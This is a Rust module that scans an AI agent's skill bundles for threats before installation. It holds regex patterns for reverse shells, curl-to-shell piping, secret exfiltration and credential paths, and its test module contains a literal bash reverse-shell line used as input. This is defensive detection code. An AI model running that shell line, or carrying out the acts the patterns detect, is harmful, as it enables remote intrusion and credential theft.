//! Install-time security scan for skill bundles.
//!
//! A focused, curated port of hermes-agent's `skills_guard`: a small set of
//! high-signal threat patterns plus structural checks, crossed with a trust
//! level. NOT a comprehensive sandbox — defense in depth before a skill's
//! files land on disk.

use once_cell::sync::Lazy;
use regex::RegexSet;

/// Severity of the worst finding in a scan.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ThreatLevel {
    Safe,
    Caution,
    Dangerous,
}

/// Provenance trust of the skill being installed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustLevel {
    /// Shipped with Aleph — always trusted.
    Builtin,
    /// From a curated/known publisher.
    Trusted,
    /// Arbitrary third-party (clawhub default).
    Community,
}

/// A single threat finding.
#[derive(Debug, Clone)]
pub struct Finding {
    pub file: String,
    pub pattern_id: &'static str,
    pub level: ThreatLevel,
}

/// Result of scanning a bundle (or one file).
#[derive(Debug, Clone)]
pub struct ScanVerdict {
    pub level: ThreatLevel,
    pub findings: Vec<Finding>,
}

struct Pattern {
    id: &'static str,
    regex: &'static str,
    level: ThreatLevel,
}

/// Curated high-signal threat patterns. Deliberately small — a regex scan is
/// bypassable; this catches the obvious, not the determined attacker.
const PATTERNS: &[Pattern] = &[
    Pattern {
        id: "reverse_shell_devtcp",
        regex: r"/dev/tcp/",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "reverse_shell_nc",
        regex: r"\bnc\b.{0,40}-e\b",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "destructive_rm_rf_root",
        regex: r"rm\s+-rf?\s+(/|~|\$HOME)\s",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "curl_pipe_shell",
        regex: r"curl\s+.{0,120}\|\s*(sh|bash)\b",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "wget_pipe_shell",
        regex: r"wget\s+.{0,120}\|\s*(sh|bash)\b",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "credential_path",
        regex: r"\.aws/credentials|\.ssh/id_rsa|secrets\.vault",
        level: ThreatLevel::Caution,
    },
    Pattern {
        id: "env_exfil",
        regex: r"curl\s+.{0,120}\$\{?[A-Z_]*(TOKEN|KEY|SECRET|PASSWORD)",
        level: ThreatLevel::Dangerous,
    },
    Pattern {
        id: "eval_base64",
        regex: r"(eval|exec)\s*\(?\s*.{0,40}base64\s+-d",
        level: ThreatLevel::Caution,
    },
];

static PATTERN_SET: Lazy<RegexSet> = Lazy::new(|| {
    RegexSet::new(PATTERNS.iter().map(|p| p.regex)).expect("guard patterns compile")
});

/// Zero-width / bidi unicode chars often used for prompt-injection hiding.
const INVISIBLE_CHARS: &[char] = &[
    '\u{200B}', '\u{200C}', '\u{200D}', '\u{2060}', '\u{FEFF}', '\u{202A}', '\u{202B}',
    '\u{202C}', '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
];

/// Scan one file's content. `file` is used only for finding labels.
pub fn scan_content(file: &str, content: &[u8]) -> ScanVerdict {
    let text = String::from_utf8_lossy(content);
    let mut findings = Vec::new();

    for idx in PATTERN_SET.matches(&text).into_iter() {
        let p = &PATTERNS[idx];
        findings.push(Finding {
            file: file.to_string(),
            pattern_id: p.id,
            level: p.level,
        });
    }
    if text.chars().any(|c| INVISIBLE_CHARS.contains(&c)) {
        findings.push(Finding {
            file: file.to_string(),
            pattern_id: "invisible_unicode",
            level: ThreatLevel::Caution,
        });
    }

    let level = findings
        .iter()
        .map(|f| f.level)
        .max_by_key(|l| match l {
            ThreatLevel::Safe => 0,
            ThreatLevel::Caution => 1,
            ThreatLevel::Dangerous => 2,
        })
        .unwrap_or(ThreatLevel::Safe);
    ScanVerdict { level, findings }
}

/// Merge multiple per-file verdicts into a bundle verdict.
pub fn merge_verdicts(verdicts: impl IntoIterator<Item = ScanVerdict>) -> ScanVerdict {
    let mut findings = Vec::new();
    for v in verdicts {
        findings.extend(v.findings);
    }
    let level = findings
        .iter()
        .map(|f| f.level)
        .max_by_key(|l| match l {
            ThreatLevel::Safe => 0,
            ThreatLevel::Caution => 1,
            ThreatLevel::Dangerous => 2,
        })
        .unwrap_or(ThreatLevel::Safe);
    ScanVerdict { level, findings }
}

/// Trust × verdict install policy. `Dangerous` is blocked for everyone except
/// `Builtin`; `Caution` is allowed for `Trusted`+; `Safe` always allowed.
pub fn install_allowed(level: ThreatLevel, trust: TrustLevel) -> bool {
    match (level, trust) {
        (ThreatLevel::Safe, _) => true,
        (ThreatLevel::Caution, TrustLevel::Community) => false,
        (ThreatLevel::Caution, _) => true,
        (ThreatLevel::Dangerous, TrustLevel::Builtin) => true,
        (ThreatLevel::Dangerous, _) => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_reverse_shell() {
        let verdict = scan_content("setup.sh", b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1");
        assert_eq!(verdict.level, ThreatLevel::Dangerous);
        assert!(!verdict.findings.is_empty());
    }

    #[test]
    fn clean_content_is_safe() {
        let verdict = scan_content("SKILL.md", b"---\nname: x\ndescription: y\n---\nHello.");
        assert_eq!(verdict.level, ThreatLevel::Safe);
    }

    #[test]
    fn install_policy_blocks_dangerous_for_community() {
        assert!(!install_allowed(ThreatLevel::Dangerous, TrustLevel::Community));
        assert!(install_allowed(ThreatLevel::Safe, TrustLevel::Community));
        assert!(install_allowed(ThreatLevel::Dangerous, TrustLevel::Builtin));
    }
}
